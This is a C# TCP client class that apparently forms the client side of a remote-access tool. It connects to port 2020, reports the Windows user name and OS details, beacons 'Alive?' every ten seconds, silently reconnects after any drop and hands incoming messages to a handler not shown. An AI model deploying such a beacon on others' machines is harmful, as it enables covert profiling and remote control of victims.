using Client;
using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;
public class ClientSocket
{
    public static Socket S;
    public static byte[] Buffer = new byte[2048001];
    public static MemoryStream MS = new MemoryStream();

    public static string EOF = "<EOF>";
    public static string SPL = "<N>";

    public static bool isConnected = false;
    public static event ReadEventHandler Read;
    public delegate void ReadEventHandler(byte[] b);


    public static void BeginConnect()
    {
        try

        {
            System.Threading.Thread.Sleep(1000);
            S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            IPAddress ipAddress = IPAddress.Parse("127.0.0.1");
            IPEndPoint ipEndPoint = new IPEndPoint(ipAddress, 2020);

            Buffer = new byte[2048001];
            MS = new MemoryStream();

            S.Connect(ipEndPoint);
            Console.WriteLine("Connected");
            isConnected = true;

            Microsoft.VisualBasic.Devices.ComputerInfo OS = new Microsoft.VisualBasic.Devices.ComputerInfo();
            Send(string.Concat("INFO", SPL, Environment.UserName, SPL, OS.OSFullName, Environment.OSVersion.ServicePack, " ", Environment.Is64BitOperatingSystem.ToString().Replace("False", "32bit").Replace("True", "64bit")));

            Read += Messages.Read;
            S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, new AsyncCallback(EndReceive), S);

            while (isConnected)
            {
                System.Threading.Thread.Sleep(10 * 1000);
                // If S.Poll(-1, SelectMode.SelectRead) And S.Available <= 0 Then
                // Exit While
                // End If
                Send("Alive?");
            }
        }
        catch (Exception ex)
        {
            Disconnected();
        }
    }

    private static void EndReceive(IAsyncResult ar)
    {
        try
        {
            int Received = S.EndReceive(ar);
            if (Received > 0)
            {
                MS.Write(Buffer, 0, Received);
                if (Helper.BS(MS.ToArray()).Contains(EOF))
                {

                    Read.Invoke(MS.ToArray());

                    MS.Flush();
                    MS.Dispose();
                    MS = new MemoryStream();
                }
            }
            S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, new AsyncCallback(EndReceive), S);
        }
        catch (Exception ex)
        {
        }
    }

    public static void Send(string msg)
    {
        try
        {
            MemoryStream M = new MemoryStream();
            M.Write(Helper.SB(msg), 0, msg.Length);
            M.Write(Helper.SB(EOF), 0, EOF.Length);
            S.BeginSend(M.ToArray(), 0, (int) M.Length, SocketFlags.None, new AsyncCallback(EndSend), S);
            M.Flush();
            M.Dispose();
        }
        catch (Exception ex)
        {
            Disconnected();
        }
    }

    private static void EndSend(IAsyncResult ar)
    {
        try
        {
            S.EndSend(ar);
        }
        catch (Exception ex)
        {
        }
    }

    private static void Disconnected()
    {
        Console.WriteLine("Server Disconnected");
        isConnected = false;

        try
        {
            if (S != null)
            {
                S.Close();
                S.Dispose();
                S = null;
            }
        }
        catch (Exception ex)
        {
        }

        try
        {
            if (MS != null)
            {
                MS.Dispose();
                MS = null;
            }
        }
        catch (Exception ex)
        {
        }

        BeginConnect();
    }
}
